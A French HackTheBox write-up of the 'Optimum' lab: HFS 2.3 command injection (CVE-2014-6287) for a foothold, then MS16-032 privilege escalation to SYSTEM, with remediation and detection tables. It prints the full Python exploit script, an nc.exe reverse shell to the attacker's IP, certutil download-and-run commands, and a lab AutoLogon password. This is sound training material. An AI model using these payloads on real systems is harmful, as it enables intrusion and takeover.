# Optimum — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-09-28 |
| **Vecteur** | HFS 2.3 RCE (CVE-2014-6287, EDB 39161) → shell `kostas` → privesc noyau MS16-032 (EDB 41020) → SYSTEM |
| **CVE** | CVE-2014-6287 (foothold, HFS 2.3) · MS16-032 / CVE-2016-0099 (privesc, Secondary Logon) |
| **Tags** | windows · web · privesc-noyau |

> Remplacer `<IP_CIBLE>` par l'IP de ta session. tun0 = `10.10.14.x` · cible = `10.129.x.x`.

> 🎯 **Objectif : ta 1re privesc Windows.** Comme Shocker : tu entres en compte
> **non privilégié**, puis tu escalades. Foothold ≠ SYSTEM.

---

## TL;DR

Le seul port ouvert (80) sert **HttpFileServer (HFS) 2.3**, vulnérable à une injection de
commande (CVE-2014-6287, contournement de filtre par `%00`). L'exploit Python fait télécharger
`nc.exe` depuis ma Kali et lance un reverse shell → utilisateur `kostas`. L'énumération montre
un **Server 2012 R2 très peu patché** (31 hotfixes, dernier de 2014), **sans `SeImpersonate`** et
sans service/tâche modifiable → seule voie : **exploit noyau MS16-032** (Secondary Logon, EDB 41020) → SYSTEM.

**Recon (HFS 2.3) → foothold RCE CVE-2014-6287 → shell `kostas` → privesc noyau MS16-032 → SYSTEM.**

---

## 1. Reconnaissance

```bash
┌──(kali㉿kali)-[~/Téléchargements]
└─$ nmap -sC -sV -p- -oA optimum <IP_CIBLE>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-28 14:34 +0200
Nmap scan report for <IP_CIBLE>
Host is up (0.053s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 212.45 seconds

```

| Port | Service | Version | Piste |
| --- | --- | --- | --- |
| 80 | HTTP | HttpFileServer httpd 2.3 | httpd 2.3 |

> Peu de ports. Note **précisément la version** du service exposé — c'est la clé de l'accès initial.

---

## 2. Accès initial (foothold)

**Méthode :** version du service → recherche d'exploit public (`searchsploit` / web) → lire, adapter, lancer.

- Service & version ciblés : `httpd 2.3`
- Exploit retenu (source, EDB-ID / CVE) : `CVE-2014-6287`
- Adaptations faites : dans `39161.py`, régler `ip_addr` = mon IP tun0 et `local_port` = port de mon listener `nc` (⚠️ les deux doivent correspondre). Servir `nc.exe` via `python3 -m http.server 80`.

```bash

cp /usr/share/windows-resources/binaries/nc.exe .

python3 -m http.server 80

nc -lvnp 4444

[ Ta Kali ]                                   [ Cible Windows ]
nc.exe dans le dossier                        exécute (via l'exploit) :
python3 -m http.server 80   ───(HTTP)────►    certutil / powershell
   « je sers nc.exe »                          « je télécharge http://10.10.14.x/nc.exe »
                                                     │
nc -lvnp 443   ◄──────(reverse shell)──────────────┘
   « j'écoute »                                nc.exe -e cmd.exe 10.10.14.x 4444

python2 39161.py <IP_CIBLE> 80


```
# script python utilisé

```python
import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""

```


- **Utilisateur obtenu :** `kostas` (⚠️ pas SYSTEM)

**Flag user :** desktop de l'utilisateur (non publié).

---

## 3. Énumération privesc (Windows)

Dérouler `windows-privesc` AVANT d'exploiter.

```powershell
whoami /priv
systeminfo            # version, architecture, correctifs (KB) installés
Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          5/10/2026, 3:40:35 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.521 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.960 MB
Virtual Memory: In Use:    543 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.

```

Outils au choix : winPEAS, Seatbelt, ou un script d'énumération de correctifs manquants.

```powershell

certutil -urlcache -split -f http://10.10.14.236/winPEASx64.exe wp.exe

DefaultUserName               :  kostas
DefaultPassword               :  kdeEjDowkS*
Matched 169 known exploited vulnerabilities for this running Windows version.
Matched products: Windows Server 2012 R2 | Windows Server 2012 R2 (Server Core installation)
CVE-2014-4113 KB3000061 [Critical] Remote Code Execution
CVE-2014-6321 KB2992611 [Critical] Remote Code Execution
CVE-2014-6332 KB3010788 [Critical] Remote Code Execution
CVE-2015-0010 KB3013455 [Critical] Remote Code Execution
CVE-2015-1635 KB3042553 [Critical] Remote Code Execution
CVE-2015-2426 KB3079904 [Critical] Remote Code Execution
CVE-2015-2433 KB3078601 [Critical] Remote Code Execution
CVE-2015-2455 KB3078601 [Critical] Remote Code Execution
CVE-2015-2456 KB3078601 [Critical] Remote Code Execution
CVE-2015-2458 KB3078601 [Critical] Remote Code Execution
CVE-2015-2459 KB3078601 [Critical] Remote Code Execution
CVE-2015-2460 KB3078601 [Critical] Remote Code Execution
CVE-2015-2462 KB3078601 [Critical] Remote Code Execution
CVE-2015-2463 KB3078601 [Critical] Remote Code Execution
CVE-2015-2464 KB3078601 [Critical] Remote Code Execution
CVE-2015-2502 KB3087985 [Critical] Remote Code Execution
CVE-2015-2507 KB3087039 [Critical] Remote Code Execution
CVE-2015-2512 KB3087039 [Critical] Remote Code Execution
CVE-2015-2527 KB3087039 [Critical] Remote Code Execution
CVE-2015-6100 KB3097877 [Critical] Remote Code Execution

```



- Lecture par élimination : **pas de `SeImpersonate`** (jeton fermé), **aucun service/tâche modifiable**, **AlwaysInstallElevated indisponible** → toutes les voies « config » fermées. Il reste : **OS 2012 R2 très peu patché** (31 hotfixes, dernier 2014) → **exploit noyau**.
- Piste retenue : **MS16-032** (Secondary Logon Handle). Note : l'AutoLogon `kostas / kdeEjDowkS*` trouvé par winPEAS est **mon propre compte** → pas une élévation.
- Binaire compilé récupéré ici : https://gitlab.com/exploit-database/exploitdb-bin-sploits (EDB **41020**).
---

## 4. Élévation de privilèges

**Méthode :** identifier ce qui manque côté correctifs / configuration → choisir la technique adaptée → l'exécuter proprement.

Piste : **MS16-032** (CVE-2016-0099). J'ai téléchargé le binaire compilé **EDB 41020** (repo bin-sploits)
sur ma Kali, servi via HTTP, tiré sur la cible, puis lancé depuis le shell `kostas` :

```powershell
:: sur la cible (dossier accessible en écriture)
cd C:\Users\kostas\Desktop
certutil -urlcache -split -f http://10.10.14.236/41020.exe ms16032.exe
ms16032.exe
:: → une nouvelle fenêtre / process s'exécute en SYSTEM
whoami
nt authority\system
```

- **Résultat :** `nt authority\system`
- Pourquoi cette technique fonctionne (pour l'oral) : le service **Secondary Logon** (`seclogon`)
  gère mal les **handles de threads** ; MS16-032 crée un thread avec un handle non correctement
  vérifié et l'utilise pour usurper le jeton d'un processus SYSTEM → élévation. C'est une **faille
  noyau/service**, corrigée par le patch KB3139914 — d'où l'importance de l'état des correctifs.
- Alternative plus propre (sans binaire tiers) : la version PowerShell `Invoke-MS16-032.ps1`, exécutable en mémoire (`IEX`).

**Flag root :** desktop Administrateur (non publié).

---

## 5. Remédiation

- **Foothold** : mettre HFS à jour (CVE-2014-6287 corrigée après 2.3c) ou le retirer ; ne pas exposer un service obsolète en frontal.
- **Privesc** : appliquer les correctifs Windows, en particulier **KB3139914** (MS16-032) ; gérer un cycle de patch régulier (ici, dernier patch en 2014).
- **Transverse** : moindre privilège du service web (il ne devrait pas permettre l'exécution de commandes), EDR pour détecter le dépôt/exécution de `nc.exe` et des exploits, filtrage sortant pour couper le pull de payload.

---

## 6. Côté Blue Team — détection

| Étape | Trace / Event | Détection |
| --- | --- | --- |
| foothold HFS RCE | requêtes `?search=%00{.exec\|...}` dans les logs HFS ; process fils anormal de `hfs.exe` (cmd/cscript) | alerte sur process enfant inattendu d'un service web (T1190, T1059) |
| download nc.exe | `certutil -urlcache` / requête HTTP sortante vers IP externe | détection living-off-the-land `certutil` + URL (T1105) |
| reverse shell | `nc.exe -e cmd.exe` → connexion sortante | EDR : nc + connexion sortante (T1059) |
| privesc MS16-032 | exploitation `seclogon`, création de thread/handle anormale, nouveau process SYSTEM issu d'un compte user | Sysmon 1 (process en SYSTEM avec parent user), EDR noyau (T1068, T1134) |

---

## 7. Leçons

- 1re privesc **Windows** : même logique que Shocker (foothold ≠ SYSTEM), mais côté Windows la voie était le **noyau** faute de jeton/service exploitable.
- **Méthode d'élimination** (fiche `lire-peas`) : écarter jeton → services → tâches → creds → conclure « noyau ». C'est la formulation attendue à l'oral.
- **bin-sploits** : beaucoup d'exploits Windows sont publiés en source ; le repo `exploitdb-bin-sploits` fournit les binaires compilés. Réflexe certif/réel : **compiler soi-même** ou préférer une version vérifiée (ici `Invoke-MS16-032.ps1`) plutôt qu'un `.exe` d'inconnu.
- Piège Python : `39161.py` est en **Python 2** (`urllib2`) → le lancer avec `python2`, et régler `ip_addr`/`local_port` avant.

---

## Références

- <exploit / write-up>
- Fiches liées : [nmap](../outils/nmap.md) · [searchsploit](../outils/searchsploit.md) · [windows-privesc](../outils/windows-privesc.md) · [reverse-shells](../outils/reverse-shells.md)
